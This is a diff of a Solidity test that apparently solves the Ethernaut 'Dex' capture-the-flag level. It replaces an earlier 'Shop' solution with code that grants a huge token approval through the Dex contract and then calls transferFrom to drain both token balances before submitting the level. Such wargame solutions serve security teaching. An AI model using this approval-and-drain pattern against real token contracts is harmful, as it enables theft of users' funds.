@@ -3,13 +3,12 @@
 pragma solidity ^0.8.10;
 
 import "ds-test/test.sol";
-import "../Shop/Shop.sol";
-import "../Shop/ShopAttack.sol";
-import "../Shop/ShopFactory.sol";
+import "../Dex/Dex.sol";
+import "../Dex/DexFactory.sol";
 import "../Ethernaut.sol";
 import "./utils/vm.sol";
 
-contract ShopTest is DSTest {
+contract DexTest is DSTest {
     Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
     Ethernaut ethernaut;
 
@@ -18,28 +17,31 @@ contract ShopTest is DSTest {
         ethernaut = new Ethernaut();
     }
 
-    function testShopAttack() public {
+    function testDexAttack() public {
         /////////////////
         // LEVEL SETUP //
         /////////////////
 
-        ShopFactory shopFactory = new ShopFactory();
-        ethernaut.registerLevel(shopFactory);
+        DexFactory dexFactory = new DexFactory();
+        ethernaut.registerLevel(dexFactory);
         vm.startPrank(tx.origin);
-        address levelAddress = ethernaut.createLevelInstance(shopFactory);
+        address _dex = ethernaut.createLevelInstance(dexFactory);
+        Dex dex = Dex(_dex);
 
         //////////////////
         // LEVEL ATTACK //
         //////////////////
 
-        ShopAttack shopAttack = new ShopAttack();
-        shopAttack.attack(levelAddress);
+        Dex(dex).approve(msg.sender, 1 << 255);
+
+        IERC20(dex.token1()).transferFrom(_dex, msg.sender, IERC20(dex.token1()).balanceOf(_dex));
+        IERC20(dex.token2()).transferFrom(_dex, msg.sender, IERC20(dex.token2()).balanceOf(_dex));
 
         //////////////////////
         // LEVEL SUBMISSION //
         //////////////////////
 
-        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
+        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(_dex));
         vm.stopPrank();
         assert(levelSuccessfullyPassed);
     }
